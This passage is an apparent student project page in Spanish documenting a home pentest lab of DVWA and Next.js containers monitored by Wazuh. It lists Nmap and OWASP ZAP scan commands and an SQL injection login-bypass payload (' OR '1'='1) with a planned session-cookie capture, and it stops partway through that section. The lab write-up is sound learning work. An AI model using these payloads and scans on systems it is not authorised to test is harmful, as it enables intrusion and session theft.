@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="es" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fase Ofensiva: Explotación y Detección SOC</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="../assets/css/site.css?v=1.1">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Outfit:wght@400;600;800&family=Fira+Code:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+        h1, h2, h3, h4 {
+            font-family: 'Outfit', sans-serif;
+        }
+        .code-font {
+            font-family: 'Fira Code', monospace;
+        }
+        .mermaid svg {
+            width: 100% !important;
+            height: auto !important;
+            max-width: 100% !important;
+        }
+    </style>
+    <!-- Importar Mermaid de forma clásica para asegurar máxima compatibilidad -->
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            mermaid.initialize({ startOnLoad: true, theme: 'neutral' });
+        });
+    </script>
+</head>
+<body class="bg-theme-atk flex justify-center text-slate-900 leading-relaxed">
+    <script>
+        async function copyCode(button, targetId) {
+            const node = document.getElementById(targetId);
+            if (!node) return;
+            try {
+                await navigator.clipboard.writeText(node.textContent);
+                const original = button.innerHTML;
+                button.innerHTML = '✨ Copiado';
+                button.classList.add('bg-emerald-500/20', 'text-emerald-300', 'border-emerald-500/30');
+                setTimeout(() => {
+                    button.innerHTML = original;
+                    button.classList.remove('bg-emerald-500/20', 'text-emerald-300', 'border-emerald-500/30');
+                }, 1600);
+            } catch (error) {
+                button.innerHTML = 'Error';
+                setTimeout(() => button.innerHTML = 'Copiar', 1600);
+            }
+        }
+    </script>
+    <main class="flex min-h-screen w-full max-w-[1440px] flex-col gap-8 px-4 py-6 md:px-8 md:py-10 lg:flex-row lg:items-start">
+        <!-- Sidebar Fijo -->
+        <aside class="lg:sticky lg:top-6 lg:h-[calc(100vh-3rem)] lg:w-80 lg:shrink-0">
+            <div class="h-full overflow-y-auto rounded-3xl border border-slate-200 bg-white/90 p-6 shadow-xl shadow-slate-200/50 backdrop-blur-md flex flex-col justify-between">
+                <div>
+                    <div class="flex items-start gap-4">
+                        <div class="flex h-12 w-12 items-center justify-center rounded-2xl bg-red-600 text-white font-bold">ATK</div>
+                        <div>
+                            <p class="text-xs font-bold uppercase tracking-[0.3em] text-red-700">Fase Ofensiva</p>
+                            <h1 class="mt-1 text-2xl font-black text-slate-950">Explotación</h1>
+                        </div>
+                    </div>
+
+                    <nav class="mt-8 space-y-2 text-sm">
+                        <a href="#portada" class="nav-link">Portada</a>
+                        <a href="#arquitectura" class="nav-link">Arquitectura del Lab</a>
+                        <a href="#vuln" class="nav-link">Reconocimiento y DAST</a>
+                        <a href="#sqli" class="nav-link">Explotación SQLi</a>
+                        <a href="#rce" class="nav-link">Explotación RCE</a>
+                        <a href="#wazuh" class="nav-link">Detección SOC (Wazuh)</a>
+                        <a href="../index.html" class="nav-link border-slate-200 bg-slate-50 text-slate-700">Volver al menú principal</a>
+                    </nav>
+                </div>
+
+                <div class="mt-8 pt-6 border-t border-slate-100 text-center text-xs text-slate-500">
+                    <p>Autor: <span class="font-semibold text-slate-800">AarónSGómez</span></p>
+                    <a href="https://asga.vercel.app" target="_blank" class="mt-1 inline-block text-red-650 hover:underline">asga.vercel.app</a>
+                </div>
+            </div>
+        </aside>
+
+        <!-- Contenedor Principal de Contenido -->
+        <section class="min-w-0 flex-1 space-y-8 pb-16">
+            <!-- Portada -->
+            <header id="portada" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-200/40 md:p-10 relative overflow-hidden">
+                <div class="absolute top-0 right-0 h-40 w-40 bg-gradient-to-br from-red-600/10 to-transparent rounded-bl-full pointer-events-none"></div>
+                <span class="inline-flex items-center gap-1.5 rounded-full bg-red-50 border border-red-200 px-3.5 py-1 text-xs font-bold text-red-700">
+                    <span class="h-2 w-2 rounded-full bg-red-600 animate-pulse"></span> Fase de Explotación y Detección SOC
+                </span>
+                <h2 class="mt-4 text-3xl font-black tracking-tight text-slate-950 md:text-5xl leading-tight">Explotación de Vulnerabilidades y Correlación SOC</h2>
+                <p class="mt-4 max-w-4xl text-base text-slate-650 md:text-lg leading-relaxed">
+                    Este documento recoge las evidencias de penetración sobre el perímetro y la posterior correlación defensiva en el SOC de Wazuh. Incluye la auditoría dinámica mediante escaneos de Nmap y OWASP ZAP, el bypass de login con inyecciones SQL y la explotación de código remoto RCE mediante RSC Deserialization.
+                </p>
+            </header>
+
+            <!-- Sección 1: Arquitectura del Laboratorio -->
+            <section id="arquitectura" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-200/40 space-y-6">
+                <div class="flex items-center gap-3">
+                    <h3 class="text-2xl font-bold text-slate-950">🌐 Arquitectura del Laboratorio</h3>
+                </div>
+                <p class="text-slate-650 leading-relaxed">
+                    Modelado de la red lógica e infraestructura del laboratorio. Demuestra la separación lógica de componentes entre el atacante (Kali Linux), los servicios expuestos en la Raspberry Pi 5 y el SOC de monitoreo (Ubuntu Server con Wazuh).
+                </p>
+
+                <!-- Evidencia 1 -->
+                <div class="rounded-2xl border border-slate-200 bg-slate-50/50 p-6 space-y-4">
+                    <div class="flex flex-wrap items-center justify-between gap-3 border-b border-slate-150 pb-3">
+                        <h4 class="text-lg font-bold text-slate-900 flex items-center gap-2">
+                            <span class="h-2 w-2 rounded-full bg-red-650"></span>
+                            Diagrama de Arquitectura y Topología de Red del Laboratorio
+                        </h4>
+                        <span class="text-xs font-bold text-slate-500">Visualizador vectorial interactivo integrado</span>
+                    </div>
+                    <div class="text-sm text-slate-700 space-y-2">
+                        <p class="font-semibold text-slate-800">Descripción de la Evidencia:</p>
+                        <p>Este diagrama modela de forma exacta la topología del laboratorio desplegado y el flujo de communications establecido. Se utiliza como marco de referencia para documentar cómo el nodo atacante interactúa de forma perimetral con los contenedores vulnerables y cómo se canalizan los eventos hacia el SIEM.</p>
+                        <p class="font-semibold text-slate-800 mt-3">Componentes de infraestructura mapeados en el laboratorio:</p>
+                        <ul class="list-disc pl-5 space-y-1 text-slate-650">
+                            <li><strong>Internet:</strong> Punto de origen que representa la conexión WAN.</li>
+                            <li><strong>DuckDNS:</strong> Servicio de resolución dinámica empleado para apuntar los subdominios a la dirección IP pública del laboratorio.</li>
+                            <li><strong>Router / NAT:</strong> Dispositivo perimetral encargado de realizar el reenvío de puertos (Port Forwarding 80/443) hacia el servidor web.</li>
+                            <li><strong>Ubuntu Server:</strong> Servidor independiente que aloja la instancia central de <strong>Wazuh Manager (SIEM/SOC)</strong>.</li>
+                            <li><strong>Raspberry Pi 5:</strong> Dispositivo físico central que hospeda los contenedores Docker vulnerables (Next.js y DVWA) y la base de datos MariaDB, con Apache2 en el host actuando como proxy reverso.</li>
+                            <li><strong>Kali Linux:</strong> Nodo ofensivo externo desde el cual se ejecutan todos los escaneos perimetrales y pruebas de penetración activa.</li>
+                        </ul>
+                    </div>
+                    <div class="mt-4 border-t border-red-100/50 pt-4">
+                        <p class="text-xs font-semibold text-slate-500 mb-2">Diagrama Interactivo de la Arquitectura (Haz clic para abrir en pantalla completa):</p>
+                        <div class="p-4 rounded-xl bg-white border border-slate-200 shadow-sm overflow-x-auto">
+                            <div id="mermaid-container" class="mermaid w-full max-w-full mx-auto py-2 cursor-zoom-in hover:opacity-95 transition-opacity">
+flowchart TD
+
+                                    %% ==== Definición de clases ====
+                                    classDef wan fill:#fee2e2,stroke:#ef4444,stroke-width:2px,color:#991b1b;
+                                    classDef host fill:#e0f2fe,stroke:#0284c7,stroke-width:2px,color:#075985;
+                                    classDef docker fill:#dcfce7,stroke:#22c55e,stroke-width:2px,color:#166534;
+                                    classDef soc fill:#e0e7ff,stroke:#6366f1,stroke-width:2px,color:#3730a3;
+
+                                    %% ==== WAN ====
+                                    subgraph WAN["Internet / Red Externa"]
+                                        Kali["Kali Linux (Atacante) IP Pública"]
+                                        Duck["DuckDNS webinsegura1 y webinsegura2"]
+                                        Kali --> Duck
+                                    end
+
+                                    %% ==== Router ====
+                                    subgraph Router["Perímetro del Lab"]
+                                        NAT["Router / NAT Redirección de Puertos 80/443"]
+                                        Duck --> NAT
+                                    end
+
+                                    %% ==== Raspberry Pi 5 ====
+                                    subgraph Pi5["Raspberry Pi 5 (Servidor Objetivo)"]
+                                        Apache["Apache2 Proxy (Host) Puerto 80/443 con HTTPS Lets Encrypt Filtra por ALLOWED_ATTACKER_IP"]
+                                        NAT --> Apache
+
+                                        Agent["Agent Wazuh (Host) Monitorea Logs Apache y security.json"]
+                                        Apache --> Agent
+
+                                        %% Docker network
+                                        subgraph DockerNet["Red Bridge: lab_net"]
+                                            Next["Next.js (modern_app) webinsegura1.duckdns.org Puerto 8081:8000"]
+                                            DVWA["cytopia/dvwa (classic_app) webinsegura2.duckdns.org Puerto 8082:80"]
+                                            MariaDB["MariaDB (db_server) Base de datos del Lab"]
+
+                                            Next --> MariaDB
+                                            DVWA --> MariaDB
+                                        end
+
+                                        Apache --> Next
+                                        Apache --> DVWA
+                                    end
+
+                                    %% ==== SOC ====
+                                    subgraph SOC["Servidor SOC"]
+                                        WazuhManager["Ubuntu Server (Wazuh Manager) SIEM / Dashboard Centralizado"]
+                                        Agent --> WazuhManager
+                                    end
+
+                                    MariaDB ~~~ WazuhManager
+
+                                    %% ==== Aplicación de clases ====
+                                    class Kali,Duck wan;
+                                    class NAT,Apache,Agent host;
+                                    class Next,DVWA,MariaDB docker;
+                                    class WazuhManager soc;
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Sección 2: Reconocimiento y Vulnerability Assessment (DAST) -->
+            <section id="vuln" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-200/40 space-y-6">
+                <div class="flex items-center gap-3">
+                    <h3 class="text-2xl font-bold text-slate-950">🔎 Reconocimiento y Vulnerability Assessment (DAST)</h3>
+                </div>
+                <p class="text-slate-650 leading-relaxed">
+                    Identificación, recopilación de información e inventario de los activos expuestos en el laboratorio por medio de técnicas OSINT y escaneos dinámicos activos (DAST) orientados a evaluar la superficie de ataque.
+                </p>
+
+                <!-- Documentación de Problemas con Greenbone/OpenVAS -->
+                <div class="rounded-2xl border border-red-300 bg-red-50/30 p-6 space-y-4">
+                    <h4 class="font-extrabold text-red-950 text-base flex items-center gap-2">
+                        ⚠ Exclusión de Greenbone/OpenVAS del Laboratorio Activo
+                    </h4>
+                    <p class="text-xs text-slate-750 leading-relaxed">
+                        Durante la fase de configuración del laboratorio sobre Kali Linux se intentó levantar el demonio de análisis de vulnerabilidades automatizado <strong>OpenVAS (GVM)</strong>. Se observó un fallo recurrente de timeout en el inicio del servicio <code>gvmd.service</code> y falta de disponibilidad de dependencias de sockets:
+                    </p>
+                    <div class="code-shell mt-2">
+                        <pre class="code-font overflow-x-auto p-4 text-[11px] leading-5 text-slate-900"><code>$ sudo systemctl status gvmd
+● gvmd.service - Greenbone Vulnerability Manager daemon (gvmd)
+   Active: activating (start) ...
+   Can't open PID file '/run/gvmd/gvmd.pid' (yet?) after start: No such file or directory
+   gvmd.service: start operation timed out. Terminating.
+   gvmd.service: Failed with result 'timeout'.</code></pre>
+                    </div>
+                    <figure class="tfg-figure">
+                        <img src="../assets/explotacion/intento%20instalacion%20gvm.png" alt="Error de GVM OpenVAS gvmd.service" class="tfg-image">
+                        <figcaption class="mt-3 text-[13px] italic text-slate-600 text-center">Detalle del error de servicios de Greenbone/OpenVAS en Kali Linux</figcaption>
+                    </figure>
+                    <blockquote class="border-l-4 border-red-650 pl-4 text-xs text-slate-700">
+                        <strong>Justificación Académica del Descarte (TFG):</strong><br>
+                        "Se procedió a la instalación y configuración de Greenbone/OpenVAS sobre Kali Linux con el objetivo de complementar el análisis automatizado de vulnerabilidades. Durante la fase de sincronización de los feeds SCAP y CERT se observaron errores de timeouts e incompatibilidades de servicios en el demonio <code>gvmd.service</code> que presentaban tiempos de resolución e impacto incompatibles con la ventana temporal del laboratorio. Por consiguiente, se optó por descartar el escaneador GVM y priorizar herramientas dinámicas y de explotación especializada como OWASP ZAP, Burp Suite, SQLMap y Wazuh, evitando redundancias en la telemetría recolectada."
+                    </blockquote>
+                </div>
+
+                <!-- Comandos por Terminal para Iniciar Escaneos Activos -->
+                <div class="space-y-4 border-t border-slate-100 pt-6">
+                    <h4 class="text-xl font-bold text-slate-950">💻 Ejecución del Análisis por Terminal</h4>
+                    
+                    <div class="mt-4">
+                        <p class="text-sm font-semibold text-slate-800">1. Escaneo de Puertos y Servicios (Nmap)</p>
+                        <div class="code-shell mt-2">
+                            <div class="flex items-center justify-between border-b border-slate-200 px-4 py-2.5 text-xs text-slate-600">
+                                <span>Escaneo Rápido (webinsegura1)</span>
+                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1 text-xs text-emerald-900 font-semibold" onclick="copyCode(this, 'c-nmap-f1')">Copiar</button>
+                            </div>
+                            <pre id="c-nmap-f1" class="code-font overflow-x-auto p-4 text-xs leading-6 text-slate-900"><code>nmap -F -Pn webinsegura1.duckdns.org</code></pre>
+                        </div>
+                        <div class="code-shell mt-3">
+                            <div class="flex items-center justify-between border-b border-slate-200 px-4 py-2.5 text-xs text-slate-600">
+                                <span>Escaneo Detallado (webinsegura1)</span>
+                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1 text-xs text-emerald-900 font-semibold" onclick="copyCode(this, 'c-nmap-full1')">Copiar</button>
+                            </div>
+                            <pre id="c-nmap-full1" class="code-font overflow-x-auto p-4 text-xs leading-6 text-slate-900"><code>nmap -sV -sC -Pn webinsegura1.duckdns.org</code></pre>
+                        </div>
+                        <div class="code-shell mt-3">
+                            <div class="flex items-center justify-between border-b border-slate-200 px-4 py-2.5 text-xs text-slate-600">
+                                <span>Escaneo Rápido (webinsegura2)</span>
+                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1 text-xs text-emerald-900 font-semibold" onclick="copyCode(this, 'c-nmap-f2')">Copiar</button>
+                            </div>
+                            <pre id="c-nmap-f2" class="code-font overflow-x-auto p-4 text-xs leading-6 text-slate-900"><code>nmap -F -Pn webinsegura2.duckdns.org</code></pre>
+                        </div>
+                    </div>
+
+                    <div class="mt-4 space-y-4">
+                        <p class="text-sm font-semibold text-slate-800">2. Análisis Dinámico DAST con OWASP ZAP (Headless Daemon o Entorno Gráfico GUI)</p>
+                        
+                        <div class="p-4 rounded-xl border border-slate-200 bg-slate-50/50 space-y-3">
+                            <p class="text-xs font-bold text-slate-900 uppercase tracking-wider">Opción A: Ejecución desde la Interfaz Gráfica (GUI) - Recomendado en Kali Escritorio</p>
+                            <ol class="list-decimal pl-5 space-y-1.5 text-xs text-slate-650">
+                                <li>Lanza la interfaz desde la terminal ejecutando el comando: <code class="code-font bg-white border px-1">zaproxy</code>.</li>
+                                <li>En la pestaña central de <strong>Quick Start</strong>, introduce la URL del objetivo (ej. <code class="code-font text-red-700">https://webinsegura1.duckdns.org</code>) en el cuadro <em>URL to attack</em>.</li>
+                                <li>Haz clic en el botón <strong>Attack</strong> para que ZAP ejecute de manera secuencial el Spider y el Active Scan.</li>
+                                <li><strong>Evidencia Principal:</strong> Dirígete a la pestaña inferior <strong>Alerts</strong> para visualizar las alertas estructuradas.</li>
+                                <li><strong>Generar Reporte:</strong> Ve al menú superior <strong>Report -> Generate Report...</strong>, selecciona la plantilla <em>Modern HTML Report</em> y haz clic en <strong>Generate Report</strong>.</li>
+                            </ol>
+                        </div>
+
+                        <div class="p-4 rounded-xl border border-slate-200 bg-slate-50/50 space-y-2">
+                            <p class="text-xs font-bold text-slate-900 uppercase tracking-wider">Opción B: Modo Headless / Daemon (Línea de Comandos)</p>
+                            <div class="code-shell mt-2">
+                                <div class="flex items-center justify-between border-b border-slate-200 px-4 py-2 text-xs text-slate-600">
+                                    <span>Terminal Kali Linux (ZAP Baseline Daemon)</span>
+                                    <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1 text-xs text-emerald-900 font-semibold" onclick="copyCode(this, 'c-zap-run')">Copiar</button>
+                                </div>
+                                <pre id="c-zap-run" class="code-font overflow-x-auto p-4 text-xs leading-6 text-slate-900"><code># Iniciar OWASP ZAP como servicio en segundo plano sin clave de API
+zap.sh -daemon -host 0.0.0.0 -port 8080 -config api.disablekey=true
+
+# Ejecutar el escaneo pasivo baseline desde la terminal
+zap-baseline.py -t https://webinsegura1.duckdns.org -r reporte_zap1.html</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Evidencias DAST -->
+                <div class="space-y-6 mt-6">
+                    <h4 class="font-extrabold text-slate-900 text-lg">📊 Evidencias Requeridas del Análisis Dinámico</h4>
+
+                    <!-- Captura 2 -->
+                    <div class="rounded-2xl border border-slate-200 bg-slate-50 p-5 space-y-4">
+                        <div class="flex items-center justify-between flex-wrap gap-2">
+                            <h4 class="text-lg font-bold text-slate-900 flex items-center gap-2">
+                                <span class="h-2 w-2 rounded-full bg-red-650"></span>
+                                🔎 Escaneo de Puertos y Servicios con Nmap
+                            </h4>
+                            <div class="flex gap-2">
+                                <a href="reconocimiento.html#webinsegura1" class="text-xs font-semibold text-cyan-650 hover:underline">webinsegura1 →</a>
+                                <span class="text-slate-300">|</span>
+                                <a href="reconocimiento.html#webinsegura2" class="text-xs font-semibold text-cyan-650 hover:underline">webinsegura2 →</a>
+                            </div>
+                        </div>
+                        <p class="text-xs text-slate-650">Verificación de disponibilidad de servicios (HTTP/HTTPS/MySQL). Se muestran las capturas de escaneo para ambos entornos:</p>
+                        
+                        <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mt-2">
+                            <div>
+                                <p class="text-[10px] font-bold text-slate-500 mb-1 text-center">webinsegura1 — Escaneo Rápido</p>
+                                <img src="../assets/reco1/image2.png" alt="Escaneo rápido Nmap webinsegura1" class="rounded-xl border border-slate-200 shadow-sm max-h-48 mx-auto">
+                            </div>
+                            <div>
+                                <p class="text-[10px] font-bold text-slate-500 mb-1 text-center">webinsegura1 — Escaneo Detallado</p>
+                                <img src="../assets/reco1/image3.png" alt="Escaneo detallado Nmap webinsegura1" class="rounded-xl border border-slate-200 shadow-sm max-h-48 mx-auto">
+                            </div>
+                            <div>
+                                <p class="text-[10px] font-bold text-slate-500 mb-1 text-center">webinsegura2 — Escaneo Rápido</p>
+                                <img src="../assets/reco1/image5.png" alt="Escaneo rápido Nmap webinsegura2" class="rounded-xl border border-slate-200 shadow-sm max-h-48 mx-auto">
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Captura 3 -->
+                    <div class="rounded-2xl border border-slate-200 bg-slate-50 p-5 space-y-4">
+                        <div class="flex items-center justify-between flex-wrap gap-2">
+                            <h4 class="text-lg font-bold text-slate-900 flex items-center gap-2">
+                                <span class="h-2 w-2 rounded-full bg-red-650"></span>
+                                🕸️ Mapeo de Subdominios y Entidades con SpiderFoot
+                            </h4>
+                            <a href="reconocimiento.html#spiderfoot" class="text-xs font-semibold text-cyan-650 hover:underline">Ver detalle en Parte 1 →</a>
+                        </div>
+                        <p class="text-xs text-slate-650">Grafo de correlación de datos y activos expuestos. Se muestran las capturas de SpiderFoot para ambos objetivos:</p>
+                        
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mt-2">
+                            <div>
+                                <p class="text-[10px] font-bold text-slate-500 mb-1 text-center">webinsegura2 — DVWA (5 Nodos)</p>
+                                <img src="../assets/reco1/image8.png" alt="Grafo Spiderfoot webinsegura2" class="rounded-xl border border-slate-200 shadow-sm max-h-48 mx-auto">
+                            </div>
+                            <div>
+                                <p class="text-[10px] font-bold text-slate-500 mb-1 text-center">webinsegura1 — Next.js (40 Nodos)</p>
+                                <img src="../assets/reco1/image9.png" alt="Grafo Spiderfoot webinsegura1" class="rounded-xl border border-slate-200 shadow-sm max-h-48 mx-auto">
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Captura 4 -->
+                    <div class="rounded-2xl border border-slate-200 bg-slate-50 p-5 space-y-4">
+                        <h4 class="text-lg font-bold text-slate-900 flex items-center gap-2">
+                            <span class="h-2 w-2 rounded-full bg-red-650"></span>
+                            ⚡ Resultados del Análisis Dinámico (DAST) con OWASP ZAP
+                        </h4>
+                        <p class="text-xs text-slate-650 font-semibold">Mapeo del progreso de escaneo dinámico (DAST) sobre ambos objetivos en Kali Linux:</p>
+                        
+                        <div class="text-sm text-slate-800 bg-white p-5 rounded-2xl border border-slate-200 space-y-3 leading-relaxed">
+                            <p>
+                                <strong>Justificación Técnica del Análisis Dinámico (DAST):</strong><br>
+                                El análisis dinámico de seguridad de aplicaciones (DAST) evalúa la aplicación en tiempo de ejecución, simulando la perspectiva de un atacante externo sin acceso al código fuente. En este TFG se ha seleccionado <strong>OWASP ZAP (Zed Attack Proxy)</strong> por ser el estándar abierto de referencia de la industria. Su propósito es interrogar activamente los endpoints HTTP/HTTPS expuestos para mapear la superficie de ataque viva.
+                            </p>
+                            <p>
+                                <strong>¿Qué buscamos identificar con el escaneo?</strong><br>
+                                Al ejecutar esta herramienta contra las aplicaciones del laboratorio (<code>webinsegura1</code> y <code>webinsegura2</code>), perseguimos la detección de fallos del <strong>OWASP Top 10</strong> que solo se manifiestan al interactuar con el servidor web en producción:
+                            </p>
+                            <ul class="list-disc pl-5 space-y-2 mt-1 text-sm text-slate-700">
+                                <li>Vectores de <strong>Cross-Site Scripting (XSS)</strong> reflejados y almacenados en parámetros de entrada.</li>
+                                <li>Parámetros vulnerables a <strong>SQL Injection (SQLi)</strong> y Path Traversal en formularios activos.</li>
+                                <li>Falta de robustez en cabeceras de respuesta (como la ausencia de <code>Content-Security-Policy</code>, <code>X-Frame-Options</code> o directivas HSTS).</li>
+                                <li>Fugas de información técnica (ficheros expuestos, cabeceras con versiones exactas del servidor web o del framework de backend).</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="space-y-4">
+                            <figure class="tfg-figure">
+                                <h5 class="text-lg font-black text-slate-950 mb-3">1. Apertura e Inicialización de OWASP ZAP en Linux (GUI)</h5>
+                                <img src="../assets/explotacion/zap1.png" alt="Apertura de OWASP ZAP en Linux" class="tfg-image">
+                                <figcaption class="mt-3 text-[13px] italic text-slate-600 text-center">Muestra la ventana principal del entorno gráfico de zaproxy cargado en la estación Kali Linux, listo para configurar el escaneo.</figcaption>
+                            </figure>
+                            
+                            <figure class="tfg-figure">
+                                <h5 class="text-lg font-black text-slate-950 mb-3">2. Alertas Detectadas en webinsegura1 (Next.js vulnerable)</h5>
+                                <img src="../assets/explotacion/zap2_webinsegura1.png" alt="Análisis de webinsegura1 en ZAP" class="tfg-image">
+                                <figcaption class="mt-3 text-[13px] italic text-slate-600 text-center">Detalle del árbol de directorios y vulnerabilidades pasivas indexadas sobre el contenedor de Next.js vulnerable antes de extraer el informe.</figcaption>
+                            </figure>
+                            
+                            <figure class="tfg-figure">
+                                <h5 class="text-lg font-black text-slate-950 mb-3">3. Progreso del Escaneo Activo sobre webinsegura2 (DVWA)</h5>
+                                <img src="../assets/explotacion/zap3_webinsegura2_progreso.png" alt="Progreso de escaneo de webinsegura2" class="tfg-image">
+                                <figcaption class="mt-3 text-[13px] italic text-slate-600 text-center">Captura en tiempo real del progreso del motor de escaneo activo apuntando a la aplicación de DVWA.</figcaption>
+                            </figure>
+                        </div>
+                    </div>
+
+                    <div class="rounded-2xl border border-slate-200 bg-slate-50 p-5 space-y-4">
+                        <h4 class="text-lg font-bold text-slate-900 flex items-center gap-2">
+                            <span class="h-2 w-2 rounded-full bg-red-650"></span>
+                            🔒 Auditoría de Cifrado y Hardening (Qualys SSL Labs)
+                        </h4>
+                        <p class="text-xs text-slate-650 font-semibold">Garantiza el correcto despliegue y hardening TLS del servidor Apache2 y certificados Let's Encrypt de producción.</p>
+                        
+                        <div class="text-sm text-slate-800 bg-white p-5 rounded-2xl border border-slate-200 space-y-3 leading-relaxed">
+                            <p>
+                                <strong>¿Qué es Qualys SSL Labs y para qué sirve?</strong><br>
+                                SSL Labs es una herramienta de auditoría de seguridad perimetral de referencia en la industria que realiza un análisis exhaustivo y profundo de la configuración de cualquier servidor web SSL/TLS expuesto a Internet. Evalúa parámetros clave como la validez y confianza del certificado X.509, el soporte de protocolos, la robustez de los conjuntos de cifrado (Cipher Suites) implementados y la mitigación activa contra vulnerabilidades criptográficas conocidas (tales como POODLE, Heartbleed, BEAST, CRIME o vulnerabilidades de renegociación).
+                            </p>
+                            <p>
+                                <strong>¿Por qué lo hemos utilizado en el TFG?</strong><br>
+                                En el contexto de este proyecto, hemos utilizado SSL Labs para verificar científicamente que la configuración de cifrado aplicada sobre el Proxy Inverso Apache2 en la Raspberry Pi 5 no solo cifra la comunicación, sino que cumple con las directrices más estrictas de <em>hardening</em> del sector. El informe certifica la calificación de <strong>A</strong> para ambos dominios, validando la implementación obligatoria de <strong>HSTS (HTTP Strict Transport Security)</strong> con una ventana temporal de larga duración y el descarte absoluto de protocolos obsoletos e inseguros (como SSL v3, TLS 1.0 y TLS 1.1), forzando el tráfico exclusivamente a través de <strong>TLS v1.2 y TLS v1.3</strong>.
+                            </p>
+                        </div>
+                        
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mt-2">
+                            <figure class="tfg-figure flex flex-col justify-between">
+                                <div>
+                                    <h5 class="text-base font-bold text-slate-950 text-center mb-2">webinsegura1 — Calificación A</h5>
+                                    <img src="../assets/explotacion/webisnegura1_%20SSL%20Labs.png" alt="SSL Labs webinsegura1" class="tfg-image">
+                                </div>
+                                <figcaption class="mt-3 text-[13px] italic text-slate-600 text-center">Certificación A otorgada por SSL Labs para la app moderna Next.js.</figcaption>
+                            </figure>
+                            <figure class="tfg-figure flex flex-col justify-between">
+                                <div>
+                                    <h5 class="text-base font-bold text-slate-950 text-center mb-2">webinsegura2 — Calificación A</h5>
+                                    <img src="../assets/explotacion/webinsegura2_%20SSL%20Labs.png" alt="SSL Labs webinsegura2" class="tfg-image">
+                                </div>
+                                <figcaption class="mt-3 text-[13px] italic text-slate-600 text-center">Certificación A para la app clásica DVWA gracias a las políticas HSTS.</figcaption>
+                            </figure>
+                        </div>
+                        
+                        <figure class="tfg-figure mt-4">
+                            <h5 class="text-base font-bold text-slate-950 mb-3">Detalle de Cifrados y Versiones TLS Soportadas</h5>
+                            <img src="../assets/explotacion/webinsegura1_%20SSL%20Labs2.png" alt="Versiones TLS en SSL Labs" class="tfg-image">
+                            <figcaption class="mt-3 text-[13px] italic text-slate-600 text-center">Desglose detallado de protocolos de cifrado soportados (con exclusividad de TLS v1.2 y TLS v1.3 y rechazo de suites obsoletas).</figcaption>
+                        </figure>
+                    </div>
+                </div>
+
+            </section>
+
+            <!-- Sección 3: Explotación Web: SQL Injection -->
+            <section id="sqli" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-200/40 space-y-6">
+                <div class="flex items-center gap-3">
+                    <h3 class="text-2xl font-bold text-slate-950">🔓 Vulnerabilidad de Acceso Web (SQL Injection en DVWA)</h3>
+                </div>
+                <p class="text-slate-650 leading-relaxed">
+                    Explotación del parámetro de consulta de DVWA mediante técnicas manuales (Burp Suite) y automatizadas (SQLMap) con el fin de evadir autenticación y sustraer la información de las bases de datos de MariaDB.
+                </p>
+
+                <!-- Evidencias SQLi -->
+                <div class="space-y-6">
+                    <h4 class="font-extrabold text-slate-900 text-lg">📊 Evidencias Requeridas de Explotación SQLi</h4>
+
+                    <!-- Captura 6 -->
+                    <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
+                        <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
+                            📸 CAPTURA 6 — Burp Suite Interceptando Login
+                        </span>
+                        <p class="text-xs text-slate-600">Interceptación de la petición HTTP POST de acceso.</p>
+                        <p class="text-xs text-slate-700 font-semibold">Debe mostrarse: El método POST a la ruta de login, y los parámetros manipulados con el payload de inyección clásica <code class="bg-white px-1 text-red-700 border">username=' OR '1'='1</code>.</p>
+                        <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
+                            [Captura 6: Burp Suite Proxy Intercept Request POST /login SQLi payload]
+                        </div>
+                    </div>
+
+                    <!-- Captura 7 -->
+                    <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
+                        <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
+                            📸 CAPTURA 7 — Login Exitoso con Bypass
+                        </span>
+                        <p class="text-xs text-slate-700 font-semibold">Debe verse: Acceso concedido al panel interno de DVWA o al Dashboard con sesión de administrador sin ingresar contraseñas.</p>
+                        <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
+                            [Captura 7: DVWA Dashboard Admin Logged In]
+                        </div>
+                    </div>
+
+                    <!-- Captura 8 -->
+                    <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
+                        <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
+                            📸 CAPTURA 8 — Cookie de Sesión Extraída
+                        </span>
+                        <p class="text-xs text-slate-700 font-semibold">Debe verse en las herramientas de desarrollo del navegador: Nombre del parámetro (<code class="code-font text-red-700 font-semibold">PHPSESSID</code>), valor hexadecimal y dominio.</p>
+                        <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
